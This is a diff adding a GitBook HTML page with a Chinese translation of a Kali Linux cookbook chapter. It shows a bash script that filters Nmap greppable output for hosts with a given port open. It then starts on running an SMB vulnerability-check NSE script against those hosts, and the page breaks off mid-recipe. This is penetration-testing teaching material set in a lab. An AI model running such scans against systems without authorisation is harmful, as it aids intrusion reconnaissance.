@@ -1,0 +1,783 @@
+
+<!DOCTYPE HTML>
+<html lang="zh" >
+    <head>
+        <meta charset="UTF-8">
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <title>第八章 自动化 Kali 工具 · Kali Linux 网络扫描秘籍</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="description" content="">
+        <meta name="generator" content="GitBook 3.2.2">
+        <meta name="author" content="wizardforcel">
+        
+        
+    
+    <link rel="stylesheet" href="gitbook/style.css">
+
+    
+            
+                
+                <link rel="stylesheet" href="gitbook/gitbook-plugin-comment/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="gitbook/gitbook-plugin-highlight/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="gitbook/gitbook-plugin-search/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="gitbook/gitbook-plugin-fontsettings/website.css">
+                
+            
+        
+
+    
+
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+        
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    
+    <link rel="prev" href="ch7.html" />
+    
+
+    </head>
+    <body>
+        
+<div class="book">
+    <div class="book-summary">
+        
+            
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="輸入並搜尋" />
+</div>
+
+            
+                <nav role="navigation">
+                
+
+
+<ul class="summary">
+    
+    
+    
+        
+        <li>
+            <a href="https://www.gitbook.com/book/wizardforcel/kali-linux-network-scanning-cookbook" target="_blank" class="custom-link">Kali Linux 网络扫描秘籍</a>
+        </li>
+    
+    
+
+    
+    <li class="divider"></li>
+    
+
+    
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="./">
+            
+                <a href="./">
+            
+                    
+                    Kali Linux 网络扫描秘籍 中文版
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2" data-path="ch1.html">
+            
+                <a href="ch1.html">
+            
+                    
+                    第一章 起步
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3" data-path="ch2.html">
+            
+                <a href="ch2.html">
+            
+                    
+                    第二章 探索扫描
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4" data-path="ch3.html">
+            
+                <a href="ch3.html">
+            
+                    
+                    第三章 端口扫描
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5" data-path="ch4.html">
+            
+                <a href="ch4.html">
+            
+                    
+                    第四章 指纹识别
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6" data-path="ch5.html">
+            
+                <a href="ch5.html">
+            
+                    
+                    第五章 漏洞扫描
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7" data-path="ch6.html">
+            
+                <a href="ch6.html">
+            
+                    
+                    第六章 拒绝服务
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8" data-path="ch7.html">
+            
+                <a href="ch7.html">
+            
+                    
+                    第七章 Web 应用扫描
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter active" data-level="1.9" data-path="ch8.html">
+            
+                <a href="ch8.html">
+            
+                    
+                    第八章 自动化 Kali 工具
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
+            本書使用 GitBook 釋出
+        </a>
+    </li>
+</ul>
+
+
+                </nav>
+            
+        
+    </div>
+
+    <div class="book-body">
+        
+            <div class="body-inner">
+                
+                    
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href="." >第八章 自动化 Kali 工具</a>
+    </h1>
+</div>
+
+
+
+
+                    <div class="page-wrapper" tabindex="-1" role="main">
+                        <div class="page-inner">
+                            
+<div id="book-search-results">
+    <div class="search-noresults">
+    
+                                <section class="normal markdown-section">
+                                
+                                <h1 id="&#x7B2C;&#x516B;&#x7AE0;-&#x81EA;&#x52A8;&#x5316;-kali-&#x5DE5;&#x5177;">&#x7B2C;&#x516B;&#x7AE0; &#x81EA;&#x52A8;&#x5316; Kali &#x5DE5;&#x5177;</h1>
+<blockquote>
+<p>&#x4F5C;&#x8005;&#xFF1A;Justin Hutchens</p>
+<p>&#x8BD1;&#x8005;&#xFF1A;<a href="https://github.com/" target="_blank">&#x98DE;&#x9F99;</a></p>
+<p>&#x534F;&#x8BAE;&#xFF1A;<a href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a></p>
+</blockquote>
+<p>Kali Linux &#x6E17;&#x900F;&#x6D4B;&#x8BD5;&#x5E73;&#x53F0;&#x63D0;&#x4F9B;&#x4E86;&#x5927;&#x91CF;&#x9AD8;&#x6548;&#x7684;&#x5DE5;&#x5177;&#xFF0C;&#x6765;&#x5B8C;&#x6210;&#x4F01;&#x4E1A;&#x6E17;&#x900F;&#x6D4B;&#x8BD5;&#x4E2D;&#x6240;&#x9700;&#x7684;&#x5927;&#x591A;&#x6570;&#x5E38;&#x89C1;&#x4EFB;&#x52A1;&#x3002; &#x7136;&#x800C;&#xFF0C;&#x6709;&#x65F6;&#x5355;&#x4E2A;&#x5DE5;&#x5177;&#x4E0D;&#x8DB3;&#x4EE5;&#x5B8C;&#x6210;&#x7ED9;&#x5B9A;&#x7684;&#x4EFB;&#x52A1;&#x3002; &#x4E0E;&#x6784;&#x5EFA;&#x5B8C;&#x5168;&#x65B0;&#x7684;&#x811A;&#x672C;&#x6216;&#x7A0B;&#x5E8F;&#x6765;&#x5B8C;&#x6210;&#x5177;&#x6709;&#x6311;&#x6218;&#x6027;&#x7684;&#x4EFB;&#x52A1;&#x76F8;&#x6BD4;&#xFF0C;&#x7F16;&#x5199;&#x4F7F;&#x7528;&#x73B0;&#x6709;&#x5DE5;&#x5177;&#x4EE5;&#x53CA;&#x6309;&#x9700;&#x4FEE;&#x6539;&#x5176;&#x884C;&#x4E3A;&#x7684;&#x811A;&#x672C;&#x901A;&#x5E38;&#x66F4;&#x6709;&#x6548;&#x3002; &#x5B9E;&#x7528;&#x7684;&#x672C;&#x5730;&#x811A;&#x672C;&#x7684;&#x5E38;&#x89C1;&#x7C7B;&#x578B;&#x5305;&#x62EC;&#x7528;&#x4E8E;&#x5206;&#x6790;&#x6216;&#x7BA1;&#x7406;&#x73B0;&#x6709;&#x5DE5;&#x5177;&#x7684;&#x8F93;&#x51FA;&#xFF0C;&#x5C06;&#x591A;&#x4E2A;&#x5DE5;&#x5177;&#x4E32;&#x8054;&#x5230;&#x4E00;&#x8D77;&#x7684;&#x811A;&#x672C;&#xFF0C;&#x6216;&#x8005;&#x5FC5;&#x987B;&#x987A;&#x5E8F;&#x6267;&#x884C;&#x7684;&#x591A;&#x7EBF;&#x7A0B;&#x4EFB;&#x52A1;&#x7684;&#x811A;&#x672C;&#x3002; </p>
+<h2 id="81-&#x7684;-nmap-greppable-&#x8F93;&#x51FA;&#x5206;&#x6790;">8.1 &#x7684; Nmap greppable &#x8F93;&#x51FA;&#x5206;&#x6790;</h2>
+<p>Nmap &#x88AB;&#x5927;&#x591A;&#x6570;&#x5B89;&#x5168;&#x4E13;&#x4E1A;&#x4EBA;&#x5458;&#x8BA4;&#x4E3A;&#x662F; Kali Linux &#x5E73;&#x53F0;&#x4E2D;&#x6700;&#x6D41;&#x7545;&#x548C;&#x6709;&#x6548;&#x7684;&#x5DE5;&#x5177;&#x4E4B;&#x4E00;&#x3002; &#x4F46;&#x662F;&#x7531;&#x4E8E;&#x8FD9;&#x4E2A;&#x5DE5;&#x5177;&#x7684;&#x60CA;&#x4EBA;&#x548C;&#x5F3A;&#x5927;&#x7684;&#x529F;&#x80FD;&#xFF0C;&#x5168;&#x9762;&#x7684;&#x7AEF;&#x53E3;&#x626B;&#x63CF;&#x548C;&#x670D;&#x52A1;&#x8BC6;&#x522B;&#x53EF;&#x80FD;&#x975E;&#x5E38;&#x8017;&#x65F6;&#x3002; &#x5728;&#x6574;&#x4E2A;&#x6E17;&#x900F;&#x6D4B;&#x8BD5;&#x4E2D;&#xFF0C;&#x4E0D;&#x9488;&#x5BF9;&#x4E0D;&#x540C;&#x7684;&#x670D;&#x52A1;&#x7AEF;&#x53E3;&#x6267;&#x884C;&#x76EE;&#x6807;&#x626B;&#x63CF;&#xFF0C;&#x800C;&#x662F;&#x5BF9;&#x6240;&#x6709;&#x53EF;&#x80FD;&#x7684; TCP &#x548C; UDP &#x670D;&#x52A1;&#x6267;&#x884C;&#x5168;&#x9762;&#x626B;&#x63CF;&#xFF0C;&#x7136;&#x540E;&#x4EC5;&#x5728;&#x6574;&#x4E2A;&#x8BC4;&#x4F30;&#x8FC7;&#x7A0B;&#x4E2D;&#x5F15;&#x7528;&#x8FD9;&#x4E9B;&#x7ED3;&#x679C;&#xFF0C;&#x662F;&#x4E00;&#x4E2A;&#x66F4;&#x597D;&#x7684;&#x65B9;&#x6CD5;&#x3002; Nmap &#x63D0;&#x4F9B;&#x4E86; XML &#x548C; greppable &#x8F93;&#x51FA;&#x683C;&#x5F0F;&#x6765;&#x8F85;&#x52A9;&#x8FD9;&#x4E2A;&#x8FC7;&#x7A0B;&#x3002;</p>
+<p>&#x7406;&#x60F3;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x4F60;&#x5E94;&#x8BE5;&#x719F;&#x6089;&#x8FD9;&#x4E9B;&#x683C;&#x5F0F;&#xFF0C;&#x4F60;&#x53EF;&#x4EE5;&#x4ECE;&#x8F93;&#x51FA;&#x6587;&#x4EF6;&#x4E2D;&#x6309;&#x9700;&#x63D0;&#x53D6;&#x6240;&#x9700;&#x7684;&#x4FE1;&#x606F;&#x3002; &#x4F46;&#x662F;&#x4F5C;&#x4E3A;&#x53C2;&#x8003;&#xFF0C;&#x6B64;&#x79D8;&#x7C4D;&#x4F1A;&#x63D0;&#x4F9B;&#x793A;&#x4F8B;&#x811A;&#x672C;&#xFF0C;&#x53EF;&#x7528;&#x4E8E;&#x63D0;&#x53D6;&#x6807;&#x8BC6;&#x4E3A;&#x5728;&#x6307;&#x5B9A;&#x7AEF;&#x53E3;&#x4E0A;&#x8FD0;&#x884C;&#x670D;&#x52A1;&#x7684;&#x6240;&#x6709; IP &#x5730;&#x5740;&#x3002;</p>
+<h3 id="&#x51C6;&#x5907;">&#x51C6;&#x5907;</h3>
+<p>&#x8981;&#x4F7F;&#x7528;&#x672C;&#x79D8;&#x7C4D;&#x4E2D;&#x6F14;&#x793A;&#x7684;&#x811A;&#x672C;&#xFF0C;&#x4F60;&#x9700;&#x8981;&#x4F7F;&#x7528; grepable &#x683C;&#x5F0F;&#x7684; Nmap &#x8F93;&#x51FA;&#x7ED3;&#x679C;&#x3002; &#x8FD9;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x6267;&#x884C; Nmap &#x7AEF;&#x53E3;&#x626B;&#x63CF;&#x5E76;&#x4F7F;&#x7528;<code>-oA</code>&#x9009;&#x9879;&#x8F93;&#x51FA;&#x6240;&#x6709;&#x683C;&#x5F0F;&#xFF0C;&#x6216;<code>-oG</code>&#x6765;&#x4E13;&#x95E8;&#x8F93;&#x51FA; greppable &#x683C;&#x5F0F;&#x6765;&#x83B7;&#x53D6;&#x3002; &#x5728;&#x63D0;&#x4F9B;&#x7684;&#x793A;&#x4F8B;&#x4E2D;&#xFF0C;&#x591A;&#x4E2A;&#x7CFB;&#x7EDF;&#x5728;&#x5355;&#x4E2A;<code>/24</code>&#x5B50;&#x7F51;&#x4E0A;&#x626B;&#x63CF;&#xFF0C;&#x8FD9;&#x5305;&#x62EC; Windows XP &#x548C; Metasploitable2&#x3002; &#x6709;&#x5173;&#x8BBE;&#x7F6E; Metasploitable2 &#x7684;&#x66F4;&#x591A;&#x4FE1;&#x606F;&#xFF0C;&#x8BF7;&#x53C2;&#x9605;&#x672C;&#x4E66;&#x7B2C;&#x4E00;&#x7AE0;&#x4E2D;&#x7684;&#x201C;&#x5B89;&#x88C5; Metasploitable2&#x201D;&#x79D8;&#x7C4D;&#x3002; &#x6709;&#x5173;&#x8BBE;&#x7F6E; Windows &#x7CFB;&#x7EDF;&#x7684;&#x66F4;&#x591A;&#x4FE1;&#x606F;&#xFF0C;&#x8BF7;&#x53C2;&#x9605;&#x672C;&#x4E66;&#x7B2C;&#x4E00;&#x7AE0;&#x4E2D;&#x7684;&#x201C;&#x5B89;&#x88C5; Windows Server&#x201D;&#x79D8;&#x7C4D;&#x3002; &#x6B64;&#x5916;&#xFF0C;&#x672C;&#x8282;&#x9700;&#x8981;&#x4F7F;&#x7528;&#x6587;&#x672C;&#x7F16;&#x8F91;&#x5668;&#xFF08;&#x5982; VIM &#x6216; Nano&#xFF09;&#x5C06;&#x811A;&#x672C;&#x5199;&#x5165;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x3002; &#x6709;&#x5173;&#x7F16;&#x5199;&#x811A;&#x672C;&#x7684;&#x66F4;&#x591A;&#x4FE1;&#x606F;&#xFF0C;&#x8BF7;&#x53C2;&#x9605;&#x672C;&#x4E66;&#x7B2C;&#x4E00;&#x7AE0;&#x4E2D;&#x7684;&#x201C;&#x4F7F;&#x7528;&#x6587;&#x672C;&#x7F16;&#x8F91;&#x5668;&#xFF08;VIM &#x548C; Nano&#xFF09;&#x201D;&#x79D8;&#x7C4D;&#x3002;</p>
+<h3 id="&#x64CD;&#x4F5C;&#x6B65;&#x9AA4;">&#x64CD;&#x4F5C;&#x6B65;&#x9AA4;</h3>
+<p>&#x4E0B;&#x9762;&#x7684;&#x793A;&#x4F8B;&#x6F14;&#x793A;&#x4E86;&#x4F7F;&#x7528; bash &#x811A;&#x672C;&#x8BED;&#x8A00;&#x751A;&#x81F3;&#x662F; bash &#x547D;&#x4EE4;&#x884C;&#x754C;&#x9762;&#xFF08;CLI&#xFF09;&#xFF0C;&#x4ECE; Nmap &#x8F93;&#x51FA;&#x7684; greppable &#x683C;&#x5F0F;&#x4E2D;&#x63D0;&#x53D6;&#x4FE1;&#x606F;&#xFF0C;&#x8FD9;&#x5341;&#x5206;&#x7B80;&#x5355;&#xFF1A;</p>
+<pre><code class="lang-sh"><span class="hljs-meta">#! /bin/bash
+</span>
+<span class="hljs-keyword">if</span> [ ! <span class="hljs-variable">$1</span> ]; <span class="hljs-keyword">then</span> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Usage: #./script &lt;port #&gt; &lt;filename&gt;&quot;</span>; 
+<span class="hljs-built_in">exit</span>; <span class="hljs-keyword">fi</span>
+
+port=<span class="hljs-variable">$1</span> 
+file=<span class="hljs-variable">$2</span>
+
+<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Systems with port <span class="hljs-variable">$port</span> open:&quot;</span>
+
+grep <span class="hljs-variable">$port</span> <span class="hljs-variable">$file</span> | grep open | cut <span class="hljs-_">-d</span> <span class="hljs-string">&quot; &quot;</span> <span class="hljs-_">-f</span> 2
+</code></pre>
+<p>&#x4E3A;&#x4E86;&#x786E;&#x4FDD;&#x4F60;&#x80FD;&#x7406;&#x89E3;&#x811A;&#x672C;&#x7684;&#x529F;&#x80FD;&#xFF0C;&#x6211;&#x4EEC;&#x5C06;&#x6309;&#x987A;&#x5E8F;&#x5BF9;&#x6BCF;&#x4E00;&#x884C;&#x8FDB;&#x884C;&#x8BB2;&#x89E3;&#x3002; &#x811A;&#x672C;&#x7684;&#x7B2C;&#x4E00;&#x884C;&#x53EA;&#x6307;&#x5411; bash &#x89E3;&#x91CA;&#x5668;&#xFF0C;&#x4EE5;&#x4FBF;&#x811A;&#x672C;&#x53EF;&#x4EE5;&#x72EC;&#x7ACB;&#x6267;&#x884C;&#x3002; &#x811A;&#x672C;&#x7684;&#x7B2C;&#x4E8C;&#x884C;&#x662F;&#x4E00;&#x4E2A;<code>if ... then</code>&#x6761;&#x4EF6;&#x8BED;&#x53E5;&#xFF0C;&#x7528;&#x4E8E;&#x6D4B;&#x8BD5;&#x662F;&#x5426;&#x5411;&#x811A;&#x672C;&#x63D0;&#x4F9B;&#x4E86;&#x4EFB;&#x4F55;&#x53C2;&#x6570;&#x3002; &#x8FD9;&#x53EA;&#x662F;&#x6700;&#x5C0F;&#x7684;&#x8F93;&#x5165;&#x9A8C;&#x8BC1;&#xFF0C;&#x4EE5;&#x786E;&#x4FDD;&#x811A;&#x672C;&#x7528;&#x6237;&#x77E5;&#x9053;&#x5DE5;&#x5177;&#x7684;&#x4F7F;&#x7528;&#x3002; &#x5982;&#x679C;&#x5DE5;&#x5177;&#x5728;&#x6CA1;&#x6709;&#x63D0;&#x4F9B;&#x4EFB;&#x4F55;&#x53C2;&#x6570;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x6267;&#x884C;&#xFF0C;&#x811A;&#x672C;&#x5C06;<code>echo</code>&#x5176;&#x4F7F;&#x7528;&#x7684;&#x63CF;&#x8FF0;&#xFF0C;&#x7136;&#x540E;&#x9000;&#x51FA;&#x3002; &#x4F7F;&#x7528;&#x63CF;&#x8FF0;&#x4F1A;&#x8BF7;&#x6C42;&#x4E24;&#x4E2A;&#x53C2;&#x6570;&#xFF0C;&#x5305;&#x62EC;&#x6216;&#x7AEF;&#x53E3;&#x53F7;&#x548C;&#x6587;&#x4EF6;&#x540D;&#x3002;</p>
+<p>&#x63A5;&#x4E0B;&#x6765;&#x7684;&#x4E24;&#x884C;&#x5C06;&#x6BCF;&#x4E2A;&#x8F93;&#x5165;&#x503C;&#x5206;&#x914D;&#x7ED9;&#x66F4;&#x6613;&#x4E8E;&#x7406;&#x89E3;&#x7684;&#x53D8;&#x91CF;&#x3002; &#x7B2C;&#x4E00;&#x4E2A;&#x8F93;&#x5165;&#x503C;&#x662F;&#x7AEF;&#x53E3;&#x53F7;&#xFF0C;&#x7B2C;&#x4E8C;&#x4E2A;&#x8F93;&#x5165;&#x503C;&#x662F; Nmap &#x8F93;&#x51FA;&#x6587;&#x4EF6;&#x3002; &#x7136;&#x540E;&#xFF0C;&#x811A;&#x672C;&#x5C06;&#x68C0;&#x67E5; Nmap greppable &#x8F93;&#x51FA;&#x6587;&#x4EF6;&#xFF0C;&#x6765;&#x5224;&#x65AD;&#x6307;&#x5B9A;&#x7AEF;&#x53E3;&#x53F7;&#x7684;&#x670D;&#x52A1;&#x4E0A;&#x8FD0;&#x884C;&#x4E86;&#x4EC0;&#x4E48;&#x7CFB;&#x7EDF;&#xFF08;&#x5982;&#x679C;&#x6709;&#x7684;&#x8BDD;&#xFF09;&#x3002;</p>
+<pre><code>root@KaliLinux:~# ./service_identifier.sh Usage: #./script &lt;port #&gt; &lt;filename&gt;
+</code></pre><p>&#x5F53;&#x4F60;&#x5728;&#x6CA1;&#x6709;&#x4EFB;&#x4F55;&#x53C2;&#x6570;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x6267;&#x884C;&#x811A;&#x672C;&#x65F6;&#xFF0C;&#x5C06;&#x8F93;&#x51FA;&#x7528;&#x6CD5;&#x63CF;&#x8FF0;&#x3002; &#x8981;&#x4F7F;&#x7528;&#x811A;&#x672C;&#xFF0C;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x8F93;&#x5165;&#x4E00;&#x4E2A;&#x8981;&#x68C0;&#x67E5;&#x7684;&#x7AEF;&#x53E3;&#x53F7;&#x548C; Nmap grepable &#x8F93;&#x51FA;&#x6587;&#x4EF6;&#x7684;&#x6587;&#x4EF6;&#x540D;&#x3002; &#x63D0;&#x4F9B;&#x7684;&#x793A;&#x4F8B;&#x5728;<code>/ 24</code>&#x7F51;&#x7EDC;&#x4E0A;&#x6267;&#x884C;&#x626B;&#x63CF;&#xFF0C;&#x5E76;&#x4F7F;&#x7528;&#x6587;&#x4EF6;&#x540D;<code>netscan.txt</code>&#x751F;&#x6210; greppable &#x8F93;&#x51FA;&#x6587;&#x4EF6;&#x3002; &#x7136;&#x540E;&#xFF0C;&#x8BE5;&#x811A;&#x672C;&#x7528;&#x4E8E;&#x5206;&#x6790;&#x6B64;&#x6587;&#x4EF6;&#xFF0C;&#x5E76;&#x786E;&#x5B9A;&#x5404;&#x4E2A;&#x7AEF;&#x53E3;&#x4E0A;&#x7684;&#x6D3B;&#x52A8;&#x670D;&#x52A1;&#x4E2D;&#x662F;&#x5426;&#x80FD;&#x53D1;&#x73B0;&#x4EFB;&#x4F55;&#x4E3B;&#x673A;&#x3002;</p>
+<pre><code>root@KaliLinux:~# ./service_identifier.sh 80 netscan.txt 
+Systems with port 80 open: 
+172.16.36.135 
+172.16.36.225 
+root@KaliLinux:~# ./service_identifier.sh 22 netscan.txt 
+Systems with port 22 open: 
+172.16.36.135 
+172.16.36.225 172.16.36.239 
+root@KaliLinux:~# ./service_identifier.sh 445 netscan.txt 
+Systems with port 445 open: 
+172.16.36.135 
+172.16.36.225
+</code></pre><p>&#x6240;&#x5C55;&#x793A;&#x7684;&#x793A;&#x4F8B;&#x6267;&#x884C;&#x811A;&#x672C;&#x6765;&#x5224;&#x65AD;&#x7AEF;&#x53E3; 80, 22 &#x548C; 445 &#x4E0A;&#x6240;&#x8FD0;&#x884C;&#x7684;&#x4E3B;&#x673A;&#x3002;&#x811A;&#x672C;&#x7684;&#x8F93;&#x51FA;&#x663E;&#x793A;&#x6B63;&#x5728;&#x8BC4;&#x4F30;&#x7684;&#x7AEF;&#x53E3;&#x53F7;&#xFF0C;&#x7136;&#x540E;&#x5217;&#x51FA;&#x8F93;&#x51FA;&#x6587;&#x4EF6;&#x4E2D;&#x4EFB;&#x4F55;&#x7CFB;&#x7EDF;&#x7684;IP&#x5730;&#x5740;&#xFF0C;&#x8FD9;&#x4E9B;&#x7CFB;&#x7EDF;&#x5728;&#x8BE5;&#x7AEF;&#x53E3;&#x4E0A;&#x8FD0;&#x884C;&#x6D3B;&#x52A8;&#x670D;&#x52A1;&#x3002;</p>
+<h3 id="&#x5DE5;&#x4F5C;&#x539F;&#x7406;">&#x5DE5;&#x4F5C;&#x539F;&#x7406;</h3>
+<p><code>grep</code>&#x662F;&#x4E00;&#x4E2A;&#x529F;&#x80FD;&#x5F3A;&#x5927;&#x7684;&#x547D;&#x4EE4;&#x884C;&#x5DE5;&#x5177;&#xFF0C;&#x53EF;&#x5728; bash &#x4E2D;&#x7528;&#x4E8E;  &#x4ECE;&#x8F93;&#x51FA;&#x6216;&#x4ECE;&#x7ED9;&#x5B9A;&#x6587;&#x4EF6;&#x4E2D;&#x63D0;&#x53D6;&#x7279;&#x5B9A;&#x5185;&#x5BB9;&#x3002; &#x5728;&#x6B64;&#x79D8;&#x7C4D;&#x63D0;&#x4F9B;&#x7684;&#x811A;&#x672C;&#x4E2D;&#xFF0C;<code>grep</code>&#x7528;&#x4E8E;&#x4ECE; Nmap grepable &#x8F93;&#x51FA;&#x6587;&#x4EF6;&#x4E2D;&#x63D0;&#x53D6;&#x7ED9;&#x5B9A;&#x7AEF;&#x53E3;&#x53F7;&#x7684;&#x4EFB;&#x4F55;&#x5B9E;&#x4F8B;&#x3002; &#x56E0;&#x4E3A;<code>grep</code>&#x51FD;&#x6570;&#x7684;&#x8F93;&#x51FA;&#x5305;&#x62EC;&#x591A;&#x6761;&#x4FE1;&#x606F;&#xFF0C;&#x6240;&#x4EE5;&#x8F93;&#x51FA;&#x901A;&#x8FC7;&#x7BA1;&#x9053;&#x4F20;&#x9012;&#x5230;<code>cut</code>&#x51FD;&#x6570;&#xFF0C;&#x6765;&#x63D0;&#x53D6; IP &#x5730;&#x5740;&#xFF0C;&#x7136;&#x540E;&#x5C06;&#x5176;&#x8F93;&#x51FA;&#x5230;&#x7EC8;&#x7AEF;&#x3002;</p>
+<h2 id="82-&#x4F7F;&#x7528;&#x6307;&#x5B9A;-nse-&#x811A;&#x672C;&#x7684;-nmap-&#x7AEF;&#x53E3;&#x626B;&#x63CF;">8.2 &#x4F7F;&#x7528;&#x6307;&#x5B9A; NSE &#x811A;&#x672C;&#x7684; Nmap &#x7AEF;&#x53E3;&#x626B;&#x63CF;</h2>
+<p>&#x8BB8;&#x591A;Nmap&#x811A;&#x672C;&#x5F15;&#x64CE;&#xFF08;NSE&#xFF09;&#x7684;&#x811A;&#x672C;&#x4EC5;&#x9002;&#x7528;&#x4E8E;&#x5728;&#x6307;&#x5B9A;&#x7AEF;&#x53E3;&#x4E0A;&#x8FD0;&#x884C;&#x7684;&#x670D;&#x52A1;&#x3002; &#x8003;&#x8651;<code>smb-check-vulns.nse</code>&#x811A;&#x672C;&#x7684;&#x7528;&#x6CD5;&#x3002; &#x6B64;&#x811A;&#x672C;&#x5C06;&#x8BC4;&#x4F30;&#x5728; TCP 445 &#x7AEF;&#x53E3;&#x4E0A;&#x8FD0;&#x884C;&#x7684; SMB &#x670D;&#x52A1;&#x7684;&#x5E38;&#x89C1;&#x670D;&#x52A1;&#x6F0F;&#x6D1E;&#x3002; &#x5982;&#x679C;&#x6B64;&#x811A;&#x672C;&#x5728;&#x6574;&#x4E2A;&#x7F51;&#x7EDC;&#x4E0A;&#x6267;&#x884C;&#xFF0C;&#x5219;&#x5FC5;&#x987B;&#x91CD;&#x65B0;&#x5B8C;&#x6210;&#x4EFB;&#x52A1;&#x6765;&#x786E;&#x5B9A;&#x7AEF;&#x53E3; 445 &#x662F;&#x5426;&#x6253;&#x5F00;&#xFF0C;&#x4EE5;&#x53CA;&#x6BCF;&#x4E2A;&#x76EE;&#x6807;&#x7CFB;&#x7EDF;&#x4E0A;&#x662F;&#x5426;&#x53EF;&#x8BBF;&#x95EE; SMB &#x670D;&#x52A1;&#x3002; &#x8FD9;&#x662F;&#x5728;&#x8BC4;&#x4F30;&#x7684;&#x626B;&#x63CF;&#x9636;&#x6BB5;&#x671F;&#x95F4;&#x53EF;&#x80FD;&#x5DF2;&#x7ECF;&#x5B8C;&#x6210;&#x7684;&#x4EFB;&#x52A1;&#x3002; Bash &#x811A;&#x672C;&#x53EF;&#x4EE5;&#x7528;&#x4E8E;&#x5229;&#x7528;&#x73B0;&#x6709;&#x7684; Nmap greppable &#x8F93;&#x51FA;&#x6587;&#x4EF6;&#x6765;&#x8FD0;&#x884C;&#x670D;&#x52A1;&#x7279;&#x5B9A;&#x7684; NSE &#x811A;&#x672C;&#xFF0C;&#x5B83;&#x4EEC;&#x53EA;&#x9488;&#x5BF9;&#x8FD0;&#x884C;&#x8FD9;&#x4E9B;&#x670D;&#x52A1;&#x7684;&#x7CFB;&#x7EDF;&#x3002; &#x5728;&#x672C;&#x79D8;&#x7C4D;&#x4E2D;&#xFF0C;&#x6211;&#x4EEC;&#x5C06;&#x6F14;&#x793A;&#x5982;&#x4F55;&#x4F7F;&#x7528;&#x811A;&#x672C;&#x6765;&#x786E;&#x5B9A;&#x5728;&#x5148;&#x524D;&#x626B;&#x63CF;&#x7ED3;&#x679C;&#x4E2D;&#x8FD0;&#x884C; TCP 445 &#x4E0A;&#x7684;&#x670D;&#x52A1;&#x7684;&#x4E3B;&#x673A;&#xFF0C;&#x7136;&#x540E;&#x4EC5;&#x9488;&#x5BF9;&#x8FD9;&#x4E9B;&#x7CFB;&#x7EDF;&#x8FD0;&#x884C;<code>smb-check-vulns.nse</code>&#x811A;&#x672C;&#x3002;</p>
+<h3 id="&#x51C6;&#x5907;">&#x51C6;&#x5907;</h3>
+<p>&#x8981;&#x4F7F;&#x7528;&#x672C;&#x79D8;&#x7C4D;&#x4E2D;&#x6F14;&#x793A;&#x7684;&#x811A;&#x672C;&#xFF0C;&#x4F60;&#x9700;&#x8981;&#x4F7F;&#x7528; grepable &#x683C;&#x5F0F;&#x7684; Nmap &#x8F93;&#x51FA;&#x7ED3;&#x679C;&#x3002; &#x8FD9;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x6267;&#x884C; Nmap &#x7AEF;&#x53E3;&#x626B;&#x63CF;&#x5E76;&#x4F7F;&#x7528;<code>-oA</code>&#x9009;&#x9879;&#x8F93;&#x51FA;&#x6240;&#x6709;&#x683C;&#x5F0F;&#xFF0C;&#x6216;<code>-oG</code>&#x6765;&#x4E13;&#x95E8;&#x8F93;&#x51FA; greppable &#x683C;&#x5F0F;&#x6765;&#x83B7;&#x53D6;&#x3002; &#x5728;&#x63D0;&#x4F9B;&#x7684;&#x793A;&#x4F8B;&#x4E2D;&#xFF0C;&#x591A;&#x4E2A;&#x7CFB;&#x7EDF;&#x5728;&#x5355;&#x4E2A;<code>/24</code>&#x5B50;&#x7F51;&#x4E0A;&#x626B;&#x63CF;&#xFF0C;&#x8FD9;&#x5305;&#x62EC; Windows XP &#x548C; Metasploitable2&#x3002; &#x6709;&#x5173;&#x8BBE;&#x7F6E; Metasploitable2 &#x7684;&#x66F4;&#x591A;&#x4FE1;&#x606F;&#xFF0C;&#x8BF7;&#x53C2;&#x9605;&#x672C;&#x4E66;&#x7B2C;&#x4E00;&#x7AE0;&#x4E2D;&#x7684;&#x201C;&#x5B89;&#x88C5; Metasploitable2&#x201D;&#x79D8;&#x7C4D;&#x3002; &#x6709;&#x5173;&#x8BBE;&#x7F6E; Windows 